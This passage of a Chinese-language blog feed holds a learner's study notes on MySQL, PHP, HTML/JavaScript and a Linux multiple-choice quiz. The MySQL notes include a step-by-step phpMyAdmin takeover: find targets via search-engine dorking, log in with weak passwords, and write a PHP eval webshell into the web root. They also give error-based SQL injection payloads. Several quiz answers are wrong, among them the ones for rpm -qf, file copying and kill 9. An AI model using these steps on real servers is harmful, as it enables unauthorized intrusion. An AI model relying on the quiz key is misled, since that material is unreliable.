开源的数据库管理器</p><p>phpadmin 基于网页的数据库管理器</p><p>mysql默认端口3306</p><p>打开数据库管理器，数据库–&gt;数据表–&gt;字段名(表头)</p><h3 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码:"></a>修改密码:</h3><p>低版本(5.x)<br>    update mysql.user set<br>    authentication_string=password(‘root’),plugin=’mysql_native_password’ where user=’root’ and     host=’localhost’;<br>    flush privileges;</p><pre><code>高版本ALTER USER &quot;root&quot;@&quot;localhost&quot; IDENTIFIED  BY &quot;你的新密码&quot;;flush privileges;</code></pre><h3 id="mysql外联"><a href="#mysql外联" class="headerlink" title="mysql外联"></a>mysql外联</h3><p>1.改表法<br>    use mysql; //选择mysql数据库</p><pre><code>update user set host = ‘%’ where user =‘root’ and host=‘localhost’;//修改数据表重启mysql关闭防火墙</code></pre><h3 id="mysql的基本函数"><a href="#mysql的基本函数" class="headerlink" title="mysql的基本函数"></a>mysql的基本函数</h3><p>select version();</p><p>select user();当前用户</p><p>select mid() 用来截取字符串中的一部分</p><p>select ord()用来显示字符ascii码</p><p>select concat() 拼接字符串</p><p>**select concat_ws() 使用分隔符来拼接(sql注入常用)</p><p>select group_concat() 和concat类似</p><p>select database()/schema() 查看当前数据库</p><p>select @@hostname; 计算机名</p><p>select @@tmpdir;</p><p>select @@datadir;存放数据的地方</p><p>select @@version;版本</p><p>select @@basedir；数据库所在位置</p><p>select connection_id(); 用户连接数</p><p>select insert(‘yuanlaide’ 1,2,’xinde’);</p><p>select left(‘asdas’,4);(向左截)</p><p>select right(‘asdas’,4);被截取的字符串，截取的长度(向右截)</p><p>select substring()/mid()/substr()都是三个参数;被截取的字符串，开始位置，截取长度。</p><p>select sleep(5);  数据库等待5s返回0</p><h3 id="mysql语法"><a href="#mysql语法" class="headerlink" title="mysql语法"></a>mysql语法</h3><h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库:"></a>创建数据库:</h4><pre><code>mysqladmin -uroot -proot create test;</code></pre><h4 id="删除数据库-drop"><a href="#删除数据库-drop" class="headerlink" title="删除数据库(drop)"></a>删除数据库(drop)</h4><h4 id="使用数据库-use"><a href="#使用数据库-use" class="headerlink" title="使用数据库(use)"></a>使用数据库(use)</h4><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><p>int    float   date   time   timestamp   char   varchar   text</p><h4 id="查看表头"><a href="#查看表头" class="headerlink" title="查看表头"></a>查看表头</h4><pre><code>DESC 表名show create table 表名</code></pre><p>if not exists</p><p>select 字段名1，字段名2，…字段名n from 表名 limit 0,1 ;limit用来限制读取记录,0是索引,1是记录数</p><h4 id="like子句"><a href="#like子句" class="headerlink" title="like子句"></a>like子句</h4><ul><li>表示任意的字符</li></ul><p>% 表示任意的字符</p><p>? 表示一个字符</p><p>select * from stu where 字段名 like ‘字符串’;   字符串可以有通配符</p><h4 id="union联合查询"><a href="#union联合查询" class="headerlink" title="union联合查询"></a>union联合查询</h4><p>select <em> from 表1 union select </em> from 表2;<br>表1和表2字段个数要相等</p><p>oreder by 条件    根据条件排序   asc升序  desc降序</p><p>oreder by 数字    按照对第n列的数字进行排序，如果n超过数据表的列数就会报错。</p><p>group by  对结果进行分组，和count,sum,avg等函数一起使用。</p><p>删除字段  alter table 表名 drop 字段名。</p><p>增加字段alter table 表名 add 字段名 字段类型。</p><p>修改字段类型alter table 表名 modify 字段名 字段类型。</p><p>修改表名alter table 原表名 rename to 新表名。</p><h4 id="导入数据"><a href="#导入数据" class="headerlink" title="导入数据"></a>导入数据</h4><pre><code>mysql -u用户名 -p密码  &lt;  要导入的数据库数据 如果数据库不会自动创建source  要导入的数据库数据mysqlimport  -uroot -p  --local database_name  dump.txt</code></pre><h4 id="导出数据"><a href="#导出数据" class="headerlink" title="导出数据"></a>导出数据</h4><pre><code>select * from  表名 into outfile 文件通过phpmyadmin来获取服务器权限(getshell)1.通过google hacker 找到phpadmin的网站2.弱口令登录，show global variables like &apos;%secure_file_priv%&apos;;判断有没有权限去写木马文件3.select &apos;&lt;?php eval($_POST[_]);?&gt;&apos; into outfile &apos;/var/www/html&apos;; 木马路径secure_file_priv 为 NULL 时，表示限制mysqld不允许导入或导出。secure_file_priv 为 /tmp （路径）时，表示限制mysqld只能在/tmp目录（路径）中执行导入导出，其他目录不能执行。secure_file_priv 没有值时，表示不限制mysqld在任意目录的导入导出。临时改变:set global secure_file_priv=&apos;&apos;;mysqldump -uroot -proot 数据库名  表名&gt; ./data.sql</code></pre><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>井号 (%23)</p><p>__</p><p>/<em> </em>/</p><h4 id="报错函数"><a href="#报错函数" class="headerlink" title="报错函数"></a>报错函数</h4><pre><code>extractvalue(XML_document，XPath_string):select * from news where tid=1 and extractvalue(1,concat(0x7e,(select user()),0x7e));UPDATEXML (XML_document, XPath_string, new_value);select * from news where tid=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</code></pre><h4 id="去重"><a href="#去重" class="headerlink" title="去重"></a>去重</h4><pre><code>select distinct 字段名 from 表名group_concat把查询结果链接一起select  group_concat(distinct 字段名) from 表名 where;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前言:对数据库特别是mysql的学习&lt;/p&gt;
&lt;h3 id=&quot;数据库&quot;&gt;&lt;a href=&quot;#数据库&quot; class=&quot;headerlink&quot; title=&quot;数据库&quot;&gt;&lt;/a&gt;数据库&lt;/h3&gt;&lt;p&gt;一个用来存放数据的服务或者平台，要么以结构化(数据库、表、数据)形式存放，要么以
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>php基础学习</title>
    <link href="https://wocao828.github.io/2018/12/16/php%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <id>https://wocao828.github.io/2018/12/16/php基础学习/</id>
    <published>2018-12-16T14:08:37.000Z</published>
    <updated>2018-12-23T11:53:04.154Z</updated>
    
    <content type="html"><![CDATA[<p>前言:经过一周的php学习，今天对php知识进行总结.</p><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>命令规则：不能以数字开头，只能a-z,A-Z，0-9，_。名字区分大小写</p><h3 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h3><p>布尔型  $a =true  false  不区分大小写</p><p>整型</p><p>浮点型</p><p>字符串  null “” ‘’（‘括起来的内容不会解释’“括起来的会解释”）</p><p>资源型   $h =fopen(‘a.php’,’r’);</p><p>数组     $i = [‘zs’,18,’a’];</p><p>对象        class presion{<br>                    $name = ‘zs’;<br>                    $age=18;}<br>                    $j = new persion(); //由class创建，j打开的成为对象</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><pre><code>echo (123);print (123); printf 123;sprintf 123;print_r (123);var_dump (123);    die  (&apos;123&apos;);exit  (&apos;123&apos;);</code></pre><h3 id="表单处理-超全局变量"><a href="#表单处理-超全局变量" class="headerlink" title="表单处理(超全局变量)"></a>表单处理(超全局变量)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$_POST</span><br><span class="line"></span><br><span class="line">$_GET</span><br><span class="line"></span><br><span class="line">$_SERVER</span><br><span class="line"></span><br><span class="line">$_REQUEST</span><br></pre></td></tr></table></figure><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><h4 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h4><p>加+ 减- 乘* 除 取余% 取值/ 拼接.</p><h4 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h4><p>赋值 += -=  *= %= /= .=</p><h4 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h4><p>大于小于等于</p><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><p>and &amp;&amp; or || not !</p><h4 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h4><p>条件? true:false</p><h3 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h3><pre><code>1.拼接字符串 $a =&quot;hello&quot;;$b=&quot;wang&quot;;$c=&quot;!&quot;;$d=$a.$b.$c;    echo $d;2.字符串长度：strlen    $a =&quot;hello&quot;;$b=&quot;wang&quot;;$c=&quot;!&quot;;$d=$a.$b.$c;    echo $d;    $len=strlen($d);    echo &quot;$d的长度是 $len&quot;3.计算中文字符长度:mb_strlen    echo &quot;$d的长度是 $len&quot;;    $a=&quot;你好&quot;;$b=&quot;王&quot;;    echo mb_strlen($a.$b);  //结果94.addslashes()   把字符串中的符号转义（防止注入）    $str=&quot;Hello &apos;wang&apos;&quot;;    常用四种（null \ &apos;&apos;&quot;&quot;）    $str1=addslashes($str);    echo &quot;处理后的内容是 $str1&quot;;5.bin2hax 字符串转换16进制      $str=&quot;Hello &apos;wang&apos;&quot;;    echo bin2hex($str);6.chop（）移除右侧空白或指定字符 一般用trim（）    $str=&quot;Hello &apos;wang&apos;  &quot;    echo trim($str,&apos;o&apos;);7.chr（）把十六进制转换成字符    ASCII码对照表    $aa=0x97;    echo chr($aa);8.md5 加密    唯一的加密值hash    $str=&apos;admin&apos;;    echo md5($str);             md5_file(&quot;文件名&quot;)把文件转换成md59.htmlentities 转义成html实体编码        例如 &amp;lt ---转成 &lt;  &amp;rt---转成 &gt;     $str=&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;;    echo htmlentities($str);10.explode   用指定字符分割字符串11.str_replace()替换/删除关键字     $old=&apos;att&apos;;   echo str_replace(&apos;att&apos;,&apos;love&apos;,$old);12.str_split 分隔函数，变成数组一一对应     $str=&quot;hello&quot;;    var_dump(str_split($str));13.strcmp 比较两个字符串    //非0即不相等 0即相等    $a=&apos;ad&apos;;$b=&apos;ac&apos;;echo&quot;&lt;br/&gt;&quot;;echo&quot;&lt;br/&gt;&quot;;    echo strcmp($a,$b);        //结果是114.strstr  查找字符串首次出现位置    $a=&apos;afhafnafanfkfaf&apos;;    echo strstr(asfasflanf,s);//结果sfasflanf</code></pre><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>强制转换<br>        （int）$var 字符串转成整形<br>        $d=”123aaa;<br>        echo (int)$d;    //123</p><pre><code>$b=123;$c=3.14;        echo (int)$d;    //3（string）$varecho (string)$b  //123(float)$var</code></pre><p>具体类型函数转换<br>        intval()<br>        floatval()<br>        stringval()</p><h3 id="条件控制"><a href="#条件控制" class="headerlink" title="条件控制"></a>条件控制</h3><h4 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h4><pre><code>if语句switch 语句</code></pre><h4 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h4><pre><code>for循环while循环</code></pre><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>数组分类：关联数组和索引数组</p><p>数组可以放任何类型的数据</p><p>数组长度计算sizeof()</p><p>数组中元素的排序sort($arr)</p><p>数组的输出for循环或foreach()</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>类,对象,成员变量,成员函数,继承,构造函数 ,析构函数</p><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p>fread()函数读取打开的文件</p><p>fwrite（）函数写入一个打开的文件</p><p>unlink（）函数删除文件</p><p>is_dir检查文件是否是目录</p><p>is_file()检查是否常规文件</p><p>file_exists（）检查文件是否存在</p><p>copy（）复制文件</p><p>rename（）重命名文件或目录</p><p>file_get_contents(文件名)  读取整个文件内容，<strong><em>打开远程文件</em></strong></p><p>php://filter file_get_contents()</p><h3 id="文件打开方式"><a href="#文件打开方式" class="headerlink" title="文件打开方式"></a>文件打开方式</h3><p>r    只读，在开头开始</p><p>r+    读写，在开头开始</p><p>w    只写，清空内容，如果不存在创建新文件</p><p>w+    读写，清空文件，不存在则创建新文件</p><p>a    追加    在末尾进行写操作，可以创建新文件</p><p>a+    读或追加    末尾写内容</p><p>x    只写（新建）</p><p>x+    读写（新建）</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>include(‘文件名’)    require(‘文件名’)</p><h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><p>setcookie(‘user’,’admin’，time()+3600)设置一个cookie</p><p>$_COOKIE[‘user’]获取一个cookie</p><p>如何放置cookie伪造？</p><p>setcookie(‘id’,’’,time()-1)清空COOKIE</p><h4 id="session"><a href="#session" class="headerlink" title="session"></a>session</h4><p>session_start()启动session功能</p><h3 id="php与mysql连接"><a href="#php与mysql连接" class="headerlink" title="php与mysql连接"></a>php与mysql连接</h3><p>(1)使用mysqli连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">mysqli_connect(&quot;IP&quot;,&quot;name&quot;,&quot;password&quot;);  //连接数据库</span><br><span class="line">mysqli_select_db();</span><br><span class="line">&lt;?php</span><br><span class="line">$dbhost = &apos;localhost:3306&apos;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &apos;root&apos;;            // mysql用户名</span><br><span class="line">$dbpass = &apos;123456&apos;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&apos;连接失败: &apos; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$sql = &apos;SELECT runoob_id, runoob_title, </span><br><span class="line">        runoob_author, submission_date</span><br><span class="line">        FROM runoob_tbl&apos;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &apos;RUNOOB&apos; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&apos;无法读取数据: &apos; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &apos;&lt;h2&gt;菜鸟教程 mysqli_fetch_array 测试&lt;h2&gt;&apos;;</span><br><span class="line">echo &apos;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;教程 ID&lt;/td&gt;&lt;td&gt;标题&lt;/td&gt;&lt;td&gt;作者&lt;/td&gt;&lt;td&gt;提交日期&lt;/td&gt;&lt;/tr&gt;&apos;;</span><br><span class="line">while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;tr&gt;&lt;td&gt; &#123;$row[&apos;runoob_id&apos;]&#125;&lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&apos;runoob_title&apos;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&apos;runoob_author&apos;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&apos;submission_date&apos;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &apos;&lt;/table&gt;&apos;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>(2)使用mysql扩展(php&lt;=5.5)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$mysql_conf = array(</span><br><span class="line">    &apos;host&apos;    =&gt; &apos;127.0.0.1:3306&apos;, </span><br><span class="line">    &apos;db&apos;      =&gt; &apos;test&apos;, </span><br><span class="line">    &apos;db_user&apos; =&gt; &apos;root&apos;, </span><br><span class="line">    &apos;db_pwd&apos;  =&gt; &apos;root&apos;, </span><br><span class="line">    );</span><br><span class="line">$mysql_conn = @mysql_connect($mysql_conf[&apos;host&apos;], $mysql_conf[&apos;db_user&apos;], $mysql_conf[&apos;db_pwd&apos;]);</span><br><span class="line">if (!$mysql_conn) &#123;</span><br><span class="line">    die(&quot;could not connect to the database:\n&quot; . mysql_error());//诊断连接错误</span><br><span class="line">&#125;</span><br><span class="line">mysql_query(&quot;set names &apos;utf8&apos;&quot;);//编码转化</span><br><span class="line">$select_db = mysql_select_db($mysql_conf[&apos;db&apos;]);//选择数据库</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (!$select_db) &#123;</span><br><span class="line">    die(&quot;could not connect to the db:\n&quot; .  mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$sql = &quot;select * from user;&quot;;</span><br><span class="line">$res = mysql_query($sql);</span><br><span class="line">if (!$res) &#123;</span><br><span class="line">    die(&quot;could get the res:\n&quot; . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while ($row = mysql_fetch_assoc($res)) &#123;</span><br><span class="line">    print_r($row);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql_close($mysql_conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>(3)使用pdo技术(防止sql注入)<br>    面向对象的方式</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前言:经过一周的php学习，今天对php知识进行总结.&lt;/p&gt;
&lt;h3 id=&quot;变量&quot;&gt;&lt;a href=&quot;#变量&quot; class=&quot;headerlink&quot; title=&quot;变量&quot;&gt;&lt;/a&gt;变量&lt;/h3&gt;&lt;p&gt;命令规则：不能以数字开头，只能a-z,A-Z，0-9，_。名字区分大小
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>html+css+js学习</title>
    <link href="https://wocao828.github.io/2018/12/16/html-css-js%E5%AD%A6%E4%B9%A0/"/>
    <id>https://wocao828.github.io/2018/12/16/html-css-js学习/</id>
    <published>2018-12-16T14:08:16.000Z</published>
    <updated>2018-12-23T10:48:01.715Z</updated>
    
    <content type="html"><![CDATA[<p>前言:</p><h3 id="html"><a href="#html" class="headerlink" title="html"></a>html</h3><pre><code><h1>标题<p>段落<a href="">链接</a><img src="">图片<ul>    <li>无序列表</li></ul><ol>    <li>有序列表</li></ol><table border="1">    <tr>        <td>标题</td><td>        </td><td>表格1</td>        <td>表格2</td>    </tr></table><form action="">    <input type="text">                </form><select>    <option value="1">a</option>    <option value="2">b</option></select></p></h1></code></pre><h3 id="css"><a href="#css" class="headerlink" title="css"></a>css</h3><p>行内样式<br>    <figure class="highlight plain"><figcaption><span>style</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">内嵌式</span><br><span class="line">```一般指&lt;head&gt;标签中的&lt;style&gt;样式</span><br></pre></td></tr></table></figure></p><p>外链式<br>通过<link>标签引入外部的CSS文件</p><h3 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h3><p>1.基础语法</p><p>2.在html中使用js<br>执行JS —–在开发者工具中执行<br>菜鸟网站，打开F12中的控制台<br>输入alert(1)       弹窗<br>window.open(“<a href="http://www.baidu.com&quot;" target="_blank" rel="noopener">http://www.baidu.com&quot;</a>) 打开网页<br>Date()输出时间<br>写法：1.写在head或body中都可可以<br>2.文件命令以.js命名<br>3.引入用 &lt;script src=”要引入的文件名”    外联<br>在文件中直接写入   alert（1）      内联</p><ol start="4"><li>document。write(输出页面的内容)<br>window。alert();  执行alert命令，一般window可省略<br>console.log();在控制台输入内容—-一般用作调试<br>innerHTML      操作HTML元素，修改内容——–<br>——-document。getElementByname（上文的内容标签）。innerHTML=‘新内容’<br>5.字面量——-变量的值<br>6.变量   定义变量—-var a=1;<br>7.注释：//行注释     /*块注释8/<br>8.函数    function changcolor(){} ——定义一个函数<br><p id="abc" onclick="">改变颜色</p><br>document.getElementById(“abc”).style=”color:red”<br>———————onchange可以用来抓取用户密码</li></ol><p>changcolor（）；  ———调用一个函数</p><p>例子：</p><p id="abc" onclick="changcolor();">改变颜色</p>——点击字体改变颜色<br>9.事件：<button> 点击</button><br>onmouseover   移动鼠标执行事件<br>onerror       在加载文档或图像时发生错误<br>例子：<button onclick="“alert（123）”"> 点击</button><br>10.html  DOM树<br>id—–&gt;js<br>class——&gt;css<br>绕过js验证：浏览器禁用js———-&gt;&gt;&gt;解决办法：在服务器上做验证<br>11.addEventListener 添加事件<br>12.聊天室练习：<p></p><blockquote><p>创建页面<br>标题，输入框，提交按钮,展示框<br>输入框需要设置ID  方便获取value值（输入的聊天内容）<br>var  data=document.getElementById(“inputid”).value<br>发送按钮（submit），设置事件（回车、点击提交），设置事件时需要调用一个更新消息的函数onclick=”submit()”</p></blockquote><p>展示框（div），需要设置id，方便向div中加入p（h）标签<br>重点：sub函数怎么写<br>功能：获取输入内容，向div中添加一个p标签</p><p><script>   function submit(){<br>var data = document.getElementById(’inputid‘)。value；<br>var para = document.createElementById(’p‘)；<br>var node =document.createTextNode(’data‘)；<br>papa.appendChild(node);</p><p>var element = document.getElementById(’divid)；<br>element.appendChild(para);<br>}<br></script><br>13.window命令    window.open(“url”)<br>window.cloes()<br>window。confirm确实框</p><p>14.location.hostname获取网址正文部分（域名）<br>location.pathname获取网址路径部分<strong><strong><em>**</em></strong></strong><br>location.port 获取端口<br>location.href  获取完整地址<br>location.protocal获取协议</p><p>15.history.back后退</p><p>16.setTimeout（）指定毫秒后执行代码—–只执行一次<br>setInetval（）指定毫秒后执行代码—-一直执行<br>var  myvar=setInterval（function（）{myvar}}，1000））<br>clearInterval()停止计时</p><p>16.document.cookie获取cookie</p><p>实验：制作秒表——<br>html页面：开始、暂停、显示时间<br>开始——button     创建onclick函数、功能自动加1、函数1：var a;a+=1;<br>document.getElementById(“divid”).InnerHTML=a;<br>var m;<br>if (a &gt; 60) {m+=1<br>}；</p><p>函数2: setInterval(f1,1000)；<br>停止——button、                   函数3chearInterval（a）：</p><p>显示：写DIV标签</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前言:&lt;/p&gt;
&lt;h3 id=&quot;html&quot;&gt;&lt;a href=&quot;#html&quot; class=&quot;headerlink&quot; title=&quot;html&quot;&gt;&lt;/a&gt;html&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;&lt;h1&gt;标题
&lt;p&gt;段落
&lt;a href=&quot;&quot;&gt;链接&lt;/a&gt;
&lt;img src=&quot;&quot;&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>linux基础50题</title>
    <link href="https://wocao828.github.io/2018/12/16/linux%E5%9F%BA%E7%A1%8050%E9%A2%98/"/>
    <id>https://wocao828.github.io/2018/12/16/linux基础50题/</id>
    <published>2018-12-16T13:26:28.000Z</published>
    <updated>2018-12-16T13:54:52.914Z</updated>
    
    <content type="html"><![CDATA[<p>前言:做了五十道linux题，对linux系统有了深入的了解。</p><ol><li>下面哪个Linux命令可以一次显示一页内容？(c)</li></ol><p>A. pause<br>B. cat<br>C. more<br>D. grep</p><p>2.统计当前目录(或文件)所占磁盘空间的大小命令是：(c)</p><p>A. df /<br>B. du /<br>C. du<br>D. df</p><ol start="5"><li>怎样更改一个文件的权限设置？(b)</li></ol><p>A. attrib<br>B. chmod<br>C. change<br>D. file</p><ol start="6"><li>假如您需要找出 /etc/my.conf 文件属于哪个包 (package) ，您可以执行：(b)</li></ol><p>A. rpm -q /etc/my.conf<br>B. rpm -requires /etc/my.conf<br>C. rpm -qf /etc/my.conf<br>D. rpm -q | grep /etc/my.conf</p><p>13.在使用了shadow口令的系统中，/etc/passwd和/etc/shadow两个文件的权限正确的是：(c)</p><p>A. -rw-r—– , -r——–<br>B. -rw-r–r– , -r–r–r–<br>C. -rw-r–r– , -r——–<br>D. -rw-r–rw- , -r—–r–</p><p>17．如果你的umask设置为022，缺省的你创建的文件的权限为：(d)</p><p>A. —-w–w-<br>B. -w–w—-<br>C. r-xr-x—<br>D. rw-r–r–</p><p>18．在一条命令中如何查找一个二进制命令 Xconfigurator 的路径？(d)</p><p>A. apropos Xconfigurator<br>B. find Xconfigurator<br>C. where Xconfigurator<br>D. which Xconfigurator</p><p>20．运行一个脚本，用户不需要什么样的权限？(b)</p><p>A. read<br>B. write<br>C. execute<br>D. browse on the directory</p><p>23．在 bash 中, 在一条命令后加入”1&gt;&amp;2” 意味着：(c)</p><p>A. 标准错误输出重定向到标准输入<br>B. 标准输入重定向到标准错误输出<br>C. 标准输出重定向到标准错误输出<br>D. 标准输出重定向到标准输入</p><p>24．下面哪条命令可以把f1.txt复制为f2.txt?(a)</p><p>A. cp f1.txt | f2.txt<br>B. cat f1.txt | f2.txt<br>C. cat f1.txt &gt; f2.txt<br>D. copy f1.txt | f2.txt</p><p>25．显示一个文件最后几行的命令是：(b)</p><p>A. tac<br>B. tail<br>C. rear<br>D. last</p><p>31.使用ln命令将生成了一个指向文件old的符号链接new，如果你将文件old删除，是否还能够访问文件中的数据？(a)</p><p>A. 不可能再访问<br>B. 仍然可以访问<br>C. 能否访问取决于文件的所有者<br>D. 能否访问取决于文件的权限</p><p>37.如何在文件中查找显示所有以”*”打头的行？(d)</p><p>A. find * file<br>B. wc -l <em> &lt; file<br>C. grep -n </em> file<br>D. grep ‘^*’ file</p><p>38.在ps命令中什么参数是用来显示所有用户的进程的？(a)</p><p>A. a<br>B. b<br>C. u<br>D. x</p><p>40.如何显示Linux系统中注册的用户数（包含系统用户）？(d)</p><p>A. account -l<br>B. nl /etc/passwd |head<br>C. wc –users /etc/passwd<br>D. wc –lines /etc/passwd</p><p>42.命令 kill 9 的含义是：(a)</p><p>A. kills the process whose PID is 9.<br>B. kills all processes belonging to UID 9.<br>C. sends SIGKILL to the process whose PID is 9.<br>D. sends SIGTERM to the process whose PID IS 9.</p><p>43.如何删除一个非空子目录/tmp？(b)</p><p>A. del /tmp/<em><br>B. rm -rf /tmp<br>C. rm -Ra /tmp/</em><br>D. rm -rf /tmp/*</p><p>48.在Linux系统中的脚本文件一般以什么开头？(b)</p><p>A. $/bin/sh<br>B. #!/bin/sh<br>C. use /bin/sh<br>D. set shell=/bin/sh</p><p>49.下面哪种写法表示如果cmd1成功执行，则执行cmd2命令？(a)</p><p>A. cmd1&amp;&amp;cmd2<br>B. cmd1|cmd2<br>C. cmd1;cmd2<br>D. cmd1||cmd2</p><p>51.Linux中，提供TCP/IP包过滤功能的软件叫什么？(c)</p><p>A. rarp<br>B. route<br>C. iptables<br>D. filter</p><p>53.在vi中退出不保存的命令是？(d)</p><p>A. :q<br>B. :w<br>C. :wq<br>D. :q!</p><p>55.使用什么命令检测基本网络连接？(a)</p><p>A. ping<br>B. route<br>C. netstat<br>D. ifconfig</p><p>56.下面哪个协议使用了二个以上的端口？(b)</p><p>A. telnet<br>B. FTP<br>C. ssh<br>D. HTTP</p><p>59.如何在Debian系统中安装rpm包？(d)</p><p>A. alien pkgname.rpm<br>B. dpkg –rpm pkgname.rpm<br>C. dpkg –alien pkgname.rpm<br>D. alien pkganme.rpm ; dpkg -i pkganme.deb<br>　<br>60.在安装软件时下面哪一步需要root权限？(d)</p><p>A. make<br>B. make deps<br>C. make config<br>D. make install</p><p>61.什么命令用来只更新已经安装过的rpm软件包？(b)</p><p>A. rpm -U <em>.rpm<br>B. rpm -F </em>.rpm<br>C. rpm -e <em>.rpm<br>D. rpm -q </em>.rpm</p><p>64.下面哪个命令可以压缩部分文件：(c)</p><p>A. tar -dzvf filename.tgz <em><br>B. tar -tzvf filename.tgz </em><br>C. tar -czvf filename.tgz <em><br>D. tar -xzvf filename.tgz </em></p><p>67.对于Apache服务器，提供的子进程的缺省的用户是：(d)</p><p>A. root<br>B. apached<br>C. httpd<br>D. nobody</p><p>69.apache的主配置文件是：(a)</p><p>A. httpd.conf<br>B. httpd.cfg<br>C. access.cfg<br>D. 